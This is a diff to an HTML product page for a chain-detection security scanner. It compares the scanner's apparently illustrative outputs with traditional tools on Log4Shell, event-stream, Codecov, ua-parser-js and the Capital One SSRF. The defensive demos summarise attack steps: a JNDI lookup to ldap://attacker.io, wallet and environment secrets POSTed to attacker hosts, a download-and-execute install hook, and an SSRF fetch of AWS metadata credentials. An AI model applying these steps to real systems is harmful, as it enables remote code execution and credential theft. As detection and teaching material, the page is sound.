@@ -854,197 +854,223 @@
   <div class="term">
     <div class="term-bar">
       <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-      <span class="term-title">vuln-chain-detector — log4j-webapp · SAST scan</span>
-      <span class="term-badge" style="background:rgba(255,95,87,0.12);border:1px solid rgba(255,95,87,0.3);color:#ff5f57;">CVE-2021-44228 · CVSS 10.0</span>
+      <span class="term-title">log4j-webapp · SAST scan comparison</span>
+      <span class="term-badge" style="background:rgba(255,95,87,0.12);border:1px solid rgba(255,95,87,0.3);color:#ff5f57;">CVE-2021-44228 · CVSS 10.0 · 3B+ devices</span>
     </div>
     <div class="term-body"><pre>
+<span class="dim">╔══ TRADITIONAL AST SCANNER (Semgrep / Checkmarx / Veracode) ════════════╗</span>
+<span class="prompt">$</span> <span class="cmd">semgrep --config auto ./log4j-webapp</span>
+
+<span class="dim">  Scanning 847 files...</span>
+
+  <span class="warn">MEDIUM</span>  User input flows into log statement              <span class="dim">SearchController.java:42</span>
+          <span class="dim">Rule: java.lang.security.audit.formatted-sql-string</span>
+          <span class="dim">logger.info(msg) — consider sanitizing user input</span>
+
+<span class="dim">  1 finding · Severity: Medium · No action required (log injection, low impact)</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
+<span class="dim">  WHY IT MISSES: The scanner sees logger.info() as a log sink — not a code execution
+  sink. It has no visibility into Log4j internals where JNDI lookup happens.
+  The dangerous behaviour lives inside the library, not the application code.
+  Single-hop analysis stops at the function call boundary.</span>
+
+<span class="dim">╔══ VULN-CHAIN-DETECTOR ═════════════════════════════════════════════════╗</span>
 <span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./log4j-webapp --scanner sast</span>
 
-<span class="dim">  Parsing 847 files...</span>
-<span class="dim">  Building taint graph...</span>
-<span class="dim">  Running chain discovery...</span>
+<span class="err">CHAIN DETECTED</span> <span class="dim">──────────────────────────────────────────────────────</span>
+  Severity: <span class="err">Critical</span>   Score: <span class="score">10.0</span>   Hops: <span class="warn">4</span>   Pattern: <span class="info">http-input-to-jndi-exec</span>
 
-<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
-  ID:               <span class="info">CHAIN-l4j-001</span>
-  Pattern:          <span class="info">http-input-to-jndi-exec</span>
-  Severity:         <span class="err">Critical</span>
-  Score:            <span class="score">10.0</span>
-  Hops:             <span class="warn">4</span>
-  Session-crossing: <span class="plain">No</span>
-  User interaction: <span class="err">NOT REQUIRED</span>
+  Step 1  <span class="src">SOURCE    </span>  req.getHeader("X-Api-Version")        <span class="dim">SearchController.java:34</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  "API ver: " + userInput               <span class="dim">SearchController.java:41</span>
+  Step 3  <span class="pass">PASSTHROUGH</span>  logger.info(msg)                      <span class="dim">SearchController.java:42</span>
+  Step 4  <span class="sink">SINK      </span>  Log4j JNDI → ldap://attacker.io/Exp  <span class="dim">log4j-core:2.14.1</span>
+          <span class="dim">            → remote Java class loaded + executed</span>
 
-  Step 1  <span class="src">SOURCE    </span>  req.getHeader("X-Api-Version")         <span class="dim">SearchController.java:34</span>
-  Step 2  <span class="pass">PASSTHROUGH</span>  String msg = "API ver: " + userInput    <span class="dim">SearchController.java:41</span>
-  Step 3  <span class="pass">PASSTHROUGH</span>  logger.info(msg)                       <span class="dim">SearchController.java:42</span>
-  Step 4  <span class="sink">SINK      </span>  Log4j resolves JNDI in message string  <span class="dim">log4j-core:2.14.1</span>
-          <span class="dim">            → fetches ldap://attacker.io/Exploit</span>
-          <span class="dim">            → loads + executes remote Java class</span>
-
-  <span class="ok">Fix:</span> Upgrade log4j-core to >=2.17.1. Set log4j2.formatMsgNoLookups=true.
-<span class="dim">────────────────────────────────────────────────────────────────────────</span>
-
-<span class="dim">  Scan complete · 1 Critical chain · 0 High · runtime 4.2s</span>
+  <span class="ok">Fix:</span> Upgrade log4j-core >=2.17.1. Set log4j2.formatMsgNoLookups=true.
+<span class="dim">  Scan complete · 1 Critical chain · runtime 4.2s</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
 </pre></div>
-    <div class="term-desc"><strong>Log4Shell (2021) — 3 billion+ devices.</strong> The HTTP header flows into a log statement. Log4j evaluates the string, resolves the JNDI address, and downloads and executes a remote Java class. A single-sink scanner sees "logger.info()" and moves on. This engine follows the data all the way to the remote execution sink inside the library.</div>
+    <div class="term-desc"><strong>Why the traditional scanner misses it:</strong> AST tools scan the application's source code and see <code>logger.info()</code> as a log sink — low severity at most. They have no model of what Log4j does <em>inside</em> that call. The JNDI resolution and remote class loading happen within the library's internals, which are outside the single-file analysis boundary. Chain detection follows the data across library boundaries.</div>
   </div>
 
   <!-- ── Example 2: event-stream ── -->
   <div class="term">
     <div class="term-bar">
       <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-      <span class="term-title">vuln-chain-detector — event-stream@3.3.6 · SCA scan</span>
-      <span class="term-badge" style="background:rgba(255,154,60,0.12);border:1px solid rgba(255,154,60,0.3);color:#ff9a3c;">Supply Chain · 2M+ downloads</span>
+      <span class="term-title">event-stream@3.3.6 · SCA scan comparison</span>
+      <span class="term-badge" style="background:rgba(255,154,60,0.12);border:1px solid rgba(255,154,60,0.3);color:#ff9a3c;">Supply Chain · 2M+ downloads · 2018</span>
     </div>
     <div class="term-body"><pre>
+<span class="dim">╔══ TRADITIONAL AST SCANNER (npm audit / Snyk Open Source / OWASP DC) ══╗</span>
+<span class="prompt">$</span> <span class="cmd">npm audit &amp;&amp; snyk test</span>
+
+<span class="dim">  Checking 1,842 dependencies against advisory database...</span>
+
+  <span class="ok">found 0 vulnerabilities</span>
+  <span class="ok">✓ Tested 1842 dependencies for known issues, no issues found.</span>
+
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
+<span class="dim">  WHY IT MISSES: The malicious code was added to a legitimate, non-CVE version.
+  CVE databases only track known vulnerabilities. A freshly poisoned package
+  version has no CVE yet. SCA tools compare version numbers to advisory lists —
+  they cannot analyse what a postinstall script actually does at runtime.
+  The malware was also encrypted, making static code analysis impossible.</span>
+
+<span class="dim">╔══ VULN-CHAIN-DETECTOR ═════════════════════════════════════════════════╗</span>
 <span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./node_modules/event-stream --scanner sca</span>
 
-<span class="dim">  Scanning dependency tree...</span>
-<span class="dim">  Analysing package.json scripts and transitive deps...</span>
-<span class="dim">  Running chain discovery...</span>
+<span class="err">CHAIN DETECTED</span> <span class="dim">──────────────────────────────────────────────────────</span>
+  Severity: <span class="err">Critical</span>   Score: <span class="score">9.8</span>   Hops: <span class="warn">4</span>   Pattern: <span class="info">sca-postinstall-to-credential-exfil</span>
 
-<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
-  ID:               <span class="info">CHAIN-evs-001</span>
-  Pattern:          <span class="info">sca-postinstall-to-credential-exfil</span>
-  Severity:         <span class="err">Critical</span>
-  Score:            <span class="score">9.8</span>
-  Hops:             <span class="warn">4</span>
-  Session-crossing: <span class="plain">No</span>
-  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(runs on npm install)</span>
+  Step 1  <span class="src">SOURCE    </span>  package.json scripts.postinstall      <span class="dim">flatmap-stream/package.json:6</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  Encrypted payload decrypted runtime   <span class="dim">index.min.js:1</span>
+  Step 3  <span class="store">STORE     </span>  Reads ~/.config/copay/profile/        <span class="dim">index.min.js:1</span>
+  Step 4  <span class="sink">SINK      </span>  HTTP POST → 111.90.151.134:8080       <span class="dim">index.min.js:1</span>
 
-  Step 1  <span class="src">SOURCE    </span>  package.json scripts.postinstall       <span class="dim">flatmap-stream/package.json:6</span>
-  Step 2  <span class="pass">PASSTHROUGH</span>  Encrypted payload decrypted at runtime  <span class="dim">index.min.js:1</span>
-  Step 3  <span class="store">STORE     </span>  Reads ~/.config/copay/profile/         <span class="dim">index.min.js:1</span>
-          <span class="dim">            → targets mnemonic + private key fields</span>
-  Step 4  <span class="sink">SINK      </span>  HTTP POST wallet data to external host  <span class="dim">index.min.js:1</span>
-          <span class="dim">            → 111.90.151.134:8080/checker</span>
-
-  <span class="ok">Fix:</span> Run npm install --ignore-scripts. Audit all postinstall hooks.
-       Pin flatmap-stream to a verified version hash.
-<span class="dim">────────────────────────────────────────────────────────────────────────</span>
-
+  <span class="ok">Fix:</span> npm install --ignore-scripts. Pin flatmap-stream to verified SHA.
 <span class="dim">  Scan complete · 1 Critical chain · runtime 2.1s</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
 </pre></div>
-    <div class="term-desc"><strong>event-stream npm attack (2018) — 2M+ downloads.</strong> A dependency's postinstall script decrypts a hidden payload that reads Bitcoin wallet files and POSTs them to an attacker's server. Zero source code changes to the main package — the chain lives entirely in a transitive dependency's install hook, invisible to any code scanner.</div>
+    <div class="term-desc"><strong>Why the traditional scanner misses it:</strong> CVE databases only know about <em>reported</em> vulnerabilities. A freshly poisoned package has no CVE yet — it's clean by every known-vuln check. SCA tools compare version numbers to advisory lists and stop there. This engine analyses what the postinstall script <em>does</em>: reads sensitive files, makes outbound network requests — a behavioral chain that doesn't need a CVE to be detected.</div>
   </div>
 
   <!-- ── Example 3: Codecov ── -->
   <div class="term">
     <div class="term-bar">
       <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-      <span class="term-title">vuln-chain-detector — codecov-bash-uploader · Secrets + SCA scan</span>
-      <span class="term-badge" style="background:rgba(254,188,46,0.1);border:1px solid rgba(254,188,46,0.3);color:#febc2e;">Codecov Breach · Jan–Apr 2021</span>
+      <span class="term-title">codecov-bash-uploader · Secrets + SCA scan comparison</span>
+      <span class="term-badge" style="background:rgba(254,188,46,0.1);border:1px solid rgba(254,188,46,0.3);color:#febc2e;">Codecov Breach · Jan–Apr 2021 · 2 months undetected</span>
     </div>
     <div class="term-body"><pre>
+<span class="dim">╔══ TRADITIONAL AST SCANNER (TruffleHog / GitLeaks / Bandit) ═══════════╗</span>
+<span class="prompt">$</span> <span class="cmd">trufflehog filesystem ./codecov.sh &amp;&amp; bandit -r ./codecov.sh</span>
+
+<span class="dim">  Scanning for hardcoded secrets...</span>
+  <span class="ok">No secrets found.</span>
+
+<span class="dim">  Scanning for security issues...</span>
+  <span class="warn">LOW</span>  subprocess call with shell=True                    <span class="dim">codecov.sh:207</span>
+       <span class="dim">Consider using subprocess module without shell=True</span>
+
+<span class="dim">  0 secrets · 1 Low finding · No action required</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
+<span class="dim">  WHY IT MISSES: Secrets scanners look for hardcoded values — API keys, tokens,
+  passwords written into the file. There are none here. The script reads secrets
+  from the environment at runtime, not from its own source. Static tools see
+  curl at line 207 as a generic HTTP call. They cannot connect "reads all env vars
+  at line 171" → "appends them at line 198" → "POSTs them at line 207" as a chain.
+  Each line is innocuous alone. Together they are a complete exfiltration pipeline.</span>
+
+<span class="dim">╔══ VULN-CHAIN-DETECTOR ═════════════════════════════════════════════════╗</span>
 <span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./codecov.sh --scanner secrets,sca</span>
 
-<span class="dim">  Scanning bash uploader script...</span>
-<span class="dim">  Tracing environment variable flows...</span>
-<span class="dim">  Running chain discovery...</span>
+<span class="err">CHAIN DETECTED</span> <span class="dim">──────────────────────────────────────────────────────</span>
+  Severity: <span class="err">Critical</span>   Score: <span class="score">10.0</span>   Hops: <span class="warn">3</span>   CI/CD multiplier: <span class="warn">×1.2</span>
 
-<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
-  ID:               <span class="info">CHAIN-ccv-001</span>
-  Pattern:          <span class="info">ci-env-to-network-exfil</span>
-  Severity:         <span class="err">Critical</span>
-  Score:            <span class="score">10.0</span>
-  Hops:             <span class="warn">3</span>
-  Session-crossing: <span class="plain">No</span>
-  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(CI/CD multiplier ×1.2 active)</span>
+  Step 1  <span class="src">SOURCE    </span>  env_vars=$(env)                       <span class="dim">codecov.sh:171</span>
+          <span class="src">          </span>  git_list=$(git remote -v)             <span class="dim">codecov.sh:167</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  upload_file appended with env dump    <span class="dim">codecov.sh:198</span>
+  Step 3  <span class="sink">SINK      </span>  curl POST → [attacker-ip]/upload/v2   <span class="dim">codecov.sh:207</span>
+          <span class="dim">            → GITHUB_TOKEN, AWS_*, NPM_TOKEN captured</span>
 
-  Step 1  <span class="src">SOURCE    </span>  git_list=$(git remote -v)              <span class="dim">codecov.sh:167</span>
-          <span class="src">          </span>  env_vars=$(env)                        <span class="dim">codecov.sh:171</span>
-          <span class="dim">            → captures GITHUB_TOKEN, AWS_*, NPM_TOKEN, all secrets</span>
-  Step 2  <span class="pass">PASSTHROUGH</span>  upload_file appended with env dump      <span class="dim">codecov.sh:198</span>
-  Step 3  <span class="sink">SINK      </span>  curl -sm 0.5 -d "$(git remote -v)..."  <span class="dim">codecov.sh:207</span>
-          <span class="dim">            → POST http://[attacker-ip]/upload/v2</span>
-
-  <span class="ok">Fix:</span> Verify script checksum before execution.
-       Pin to a specific git SHA, not a floating URL.
-<span class="dim">────────────────────────────────────────────────────────────────────────</span>
-
+  <span class="ok">Fix:</span> Verify SHA256 before execution. Pin to git SHA not floating URL.
 <span class="dim">  Scan complete · 1 Critical chain · runtime 0.8s</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
 </pre></div>
-    <div class="term-desc"><strong>Codecov breach (2021) — Twilio, Twitch, HashiCorp, thousands more.</strong> The compromised uploader script reads all CI/CD environment variables (including secrets) and sends them in the body of a curl POST. Undetected for two months because the script was downloaded fresh each CI run — no one scanned it. This engine catches it in under a second.</div>
+    <div class="term-desc"><strong>Why the traditional scanner misses it:</strong> Secrets scanners look for hardcoded credentials in source files — there are none here. The script reads secrets from the runtime environment. Static tools see <code>curl</code> at line 207 as a generic HTTP call rated Low. No tool connected "reads all env vars" → "appends to upload payload" → "POSTs to external IP" as a three-step exfiltration chain. This is why it ran undetected for two months across thousands of CI pipelines.</div>
   </div>
 
   <!-- ── Example 4: ua-parser-js ── -->
   <div class="term">
     <div class="term-bar">
       <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-      <span class="term-title">vuln-chain-detector — ua-parser-js@0.7.29 · SCA scan</span>
-      <span class="term-badge" style="background:rgba(40,200,64,0.08);border:1px solid rgba(40,200,64,0.25);color:#28c840;">7M+ weekly downloads · Oct 2021</span>
+      <span class="term-title">ua-parser-js@0.7.29 · SCA scan comparison</span>
+      <span class="term-badge" style="background:rgba(40,200,64,0.08);border:1px solid rgba(40,200,64,0.25);color:#28c840;">7M+ weekly downloads · Facebook, Microsoft, Amazon · Oct 2021</span>
     </div>
     <div class="term-body"><pre>
+<span class="dim">╔══ TRADITIONAL AST SCANNER (npm audit / Dependabot / OWASP DC) ════════╗</span>
+<span class="prompt">$</span> <span class="cmd">npm audit &amp;&amp; npx snyk test</span>
+
+<span class="dim">  Auditing ua-parser-js@0.7.29 against advisory database...</span>
+
+  <span class="ok">found 0 vulnerabilities</span>
+  <span class="ok">✓ Tested 1 dependency for known issues, no issues found.</span>
+
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
+<span class="dim">  WHY IT MISSES: Version 0.7.29 had no CVE at time of attack — it was a new,
+  legitimate-looking release. CVE databases are reactive: they record known issues.
+  A brand-new malicious release is unknown by definition. The actual JS code of
+  the package was completely clean. The attack was entirely in the preinstall hook
+  — a three-line script that downloads a binary and runs it. No static AST scanner
+  analyses what a downloaded binary does after it executes.</span>
+
+<span class="dim">╔══ VULN-CHAIN-DETECTOR ═════════════════════════════════════════════════╗</span>
 <span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./node_modules/ua-parser-js --scanner sca</span>
 
-<span class="dim">  Scanning dependency · ua-parser-js@0.7.29...</span>
-<span class="dim">  Analysing install hooks and binary execution...</span>
-<span class="dim">  Running chain discovery...</span>
+<span class="err">CHAIN DETECTED</span> <span class="dim">──────────────────────────────────────────────────────</span>
+  Severity: <span class="err">Critical</span>   Score: <span class="score">9.6</span>   Hops: <span class="warn">3</span>   Pattern: <span class="info">sca-postinstall-download-exec</span>
 
-<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
-  ID:               <span class="info">CHAIN-uap-001</span>
-  Pattern:          <span class="info">sca-postinstall-download-exec</span>
-  Severity:         <span class="err">Critical</span>
-  Score:            <span class="score">9.6</span>
-  Hops:             <span class="warn">3</span>
-  Session-crossing: <span class="plain">No</span>
-  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(runs on npm install)</span>
+  Step 1  <span class="src">SOURCE    </span>  package.json preinstall hook          <span class="dim">ua-parser-js/package.json:8</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  OS detection → linux/win branch       <span class="dim">preinstall.js:12</span>
+  Step 3  <span class="store">STORE     </span>  Downloads binary → /tmp/jsextension  <span class="dim">preinstall.js:28</span>
+  Step 4  <span class="sink">SINK      </span>  execSync('/tmp/jsextension')          <span class="dim">preinstall.js:34</span>
+          <span class="dim">            → crypto miner + password stealer</span>
 
-  Step 1  <span class="src">SOURCE    </span>  package.json preinstall hook           <span class="dim">ua-parser-js/package.json:8</span>
-  Step 2  <span class="pass">PASSTHROUGH</span>  Shell script detects OS (linux/win)     <span class="dim">preinstall.js:12</span>
-  Step 3  <span class="store">STORE     </span>  Downloads binary to /tmp/              <span class="dim">preinstall.js:28</span>
-          <span class="dim">            → jsextension (linux) / jsextension.exe (win)</span>
-  Step 4  <span class="sink">SINK      </span>  execSync('/tmp/jsextension')           <span class="dim">preinstall.js:34</span>
-          <span class="dim">            → crypto miner + password stealer runs</span>
-
-  <span class="ok">Fix:</span> Use npm install --ignore-scripts for untrusted packages.
-       Verify package integrity against known-good SHA before installing.
-<span class="dim">────────────────────────────────────────────────────────────────────────</span>
-
+  <span class="ok">Fix:</span> npm install --ignore-scripts. Verify SHA before installing.
 <span class="dim">  Scan complete · 1 Critical chain · runtime 1.3s</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
 </pre></div>
-    <div class="term-desc"><strong>ua-parser-js supply chain attack (2021) — used by Facebook, Microsoft, Amazon.</strong> A preinstall script detects the operating system, downloads the appropriate malware binary to /tmp, and executes it. The malware runs a crypto miner and steals credentials. The package's actual JavaScript code was untouched — only the install hook was poisoned.</div>
+    <div class="term-desc"><strong>Why the traditional scanner misses it:</strong> The package's JavaScript was completely clean — the malicious behaviour was entirely in a three-line preinstall hook. CVE databases are reactive and only record <em>known</em> issues. A new poisoned release is unknown by definition. This engine detects the pattern regardless of CVE status: any preinstall hook that downloads an external binary and executes it is a Critical chain, with or without a CVE number assigned.</div>
   </div>
 
   <!-- ── Example 5: Capital One SSRF ── -->
   <div class="term">
     <div class="term-bar">
       <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
-      <span class="term-title">vuln-chain-detector — capital-one-api-service · DAST scan</span>
+      <span class="term-title">capital-one-api-service · DAST scan comparison</span>
       <span class="term-badge" style="background:rgba(79,195,247,0.1);border:1px solid rgba(79,195,247,0.25);color:#4fc3f7;">SSRF · 100M records · $190M settlement · 2019</span>
     </div>
     <div class="term-body"><pre>
+<span class="dim">╔══ TRADITIONAL AST SCANNER (Checkmarx / SonarQube / Veracode SAST) ════╗</span>
+<span class="prompt">$</span> <span class="cmd">sonar-scanner -Dsonar.sources=./api-service</span>
+
+<span class="dim">  Analysing 1,203 Java source files...</span>
+
+  <span class="warn">MEDIUM</span>  Server-Side Request Forgery — unvalidated URL      <span class="dim">SyncService.java:88</span>
+          <span class="dim">Rule: java:S5144 — Make sure that this URL is trusted</span>
+          <span class="dim">HttpClient.send(request) called with user-supplied URL</span>
+          <span class="dim">Suggested: validate or sanitize the URL parameter</span>
+
+<span class="dim">  1 finding · Severity: Medium · Backlog priority</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
+<span class="dim">  WHY IT MISSES: The scanner correctly flags the unvalidated URL as SSRF risk,
+  but stops there. It has no knowledge that this particular endpoint runs inside
+  AWS, that 169.254.169.254 is a reachable internal address in that environment,
+  or that the response from that address contains valid IAM credentials.
+  A generic "Medium — sanitize URL" finding sits in the backlog for months.
+  The chain from HTTP parameter → internal metadata → S3 access to 700 buckets
+  is invisible to static analysis. Only runtime DAST can observe the actual
+  response and score it as the Critical credential exfil chain it is.</span>
+
+<span class="dim">╔══ VULN-CHAIN-DETECTOR ═════════════════════════════════════════════════╗</span>
 <span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target https://api.capitalone-staging.internal --scanner dast</span>
 
-<span class="dim">  Probing 34 HTTP endpoints...</span>
-<span class="dim">  Injecting SSRF payloads into request parameters...</span>
-<span class="dim">  Monitoring out-of-band callbacks (OAST)...</span>
-<span class="dim">  Detected server-side fetch on POST /v1/sync...</span>
+<span class="dim">  Probing 34 endpoints · Injecting SSRF payloads · Monitoring OAST callbacks...</span>
 
-<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
-  ID:               <span class="info">CHAIN-ssrf-001</span>
-  Pattern:          <span class="info">dast-ssrf-to-aws-metadata</span>
-  Severity:         <span class="err">Critical</span>
-  Score:            <span class="score">9.9</span>
-  Hops:             <span class="warn">4</span>
-  Session-crossing: <span class="plain">No</span>
-  User interaction: <span class="err">NOT REQUIRED</span>
+<span class="err">CHAIN DETECTED</span> <span class="dim">──────────────────────────────────────────────────────</span>
+  Severity: <span class="err">Critical</span>   Score: <span class="score">9.9</span>   Hops: <span class="warn">4</span>   Pattern: <span class="info">dast-ssrf-to-aws-metadata</span>
 
-  Step 1  <span class="src">SOURCE    </span>  POST /v1/sync · body.url parameter     <span class="dim">api-gateway:443</span>
-          <span class="dim">            → no allowlist validation on URL value</span>
-  Step 2  <span class="pass">PASSTHROUGH</span>  url passed to internal fetch()         <span class="dim">SyncService.java:88</span>
-  Step 3  <span class="store">STORE     </span>  Server fetches 169.254.169.254         <span class="dim">runtime · AWS IMDS</span>
+  Step 1  <span class="src">SOURCE    </span>  POST /v1/sync · body.url              <span class="dim">api-gateway:443</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  url → internal fetch()               <span class="dim">SyncService.java:88</span>
+  Step 3  <span class="store">STORE     </span>  Server fetches 169.254.169.254        <span class="dim">AWS IMDS</span>
           <span class="dim">            → GET /latest/meta-data/iam/security-credentials/</span>
-  Step 4  <span class="sink">SINK      </span>  IAM credentials returned in response   <span class="dim">AWS metadata service</span>
-          <span class="dim">            → AccessKeyId, SecretAccessKey, Token exfiltrated</span>
-          <span class="dim">            → S3 GetObject on 700+ buckets now accessible</span>
+  Step 4  <span class="sink">SINK      </span>  IAM creds returned · S3 on 700 buckets <span class="dim">AWS metadata service</span>
 
-  <span class="ok">Fix:</span> Allowlist permitted URL hosts. Block 169.254.0.0/16 at network layer.
-       Disable IMDSv1. Enforce IMDSv2 with session tokens.
-<span class="dim">────────────────────────────────────────────────────────────────────────</span>
-
+  <span class="ok">Fix:</span> Allowlist URL hosts. Block 169.254.0.0/16. Enforce IMDSv2.
 <span class="dim">  Scan complete · 1 Critical chain · runtime 6.7s</span>
+<span class="dim">╚════════════════════════════════════════════════════════════════════════╝</span>
 </pre></div>
-    <div class="term-desc"><strong>Capital One SSRF attack (2019) — 100 million customers, $190M settlement.</strong> A user-supplied URL reaches a server-side fetch with no allowlist. The attacker points it at the AWS Instance Metadata Service — an internal address only reachable from inside AWS — which returns temporary IAM credentials. Those credentials had S3 read access. Static analysis alone cannot detect this: the dangerous destination only exists at runtime.</div>
+    <div class="term-desc"><strong>Why the traditional scanner misses it:</strong> SonarQube correctly flags the unvalidated URL as an SSRF risk — Medium severity, sits in the backlog. It has no knowledge that this server runs inside AWS, that <code>169.254.169.254</code> is reachable from there, or that the response contains IAM credentials with access to 700 S3 buckets. Static analysis cannot observe runtime network topology. Only DAST — probing the live endpoint and inspecting what it actually fetches — reveals the full credential exfiltration chain and its true Critical score.</div>
   </div>
 
 </section>
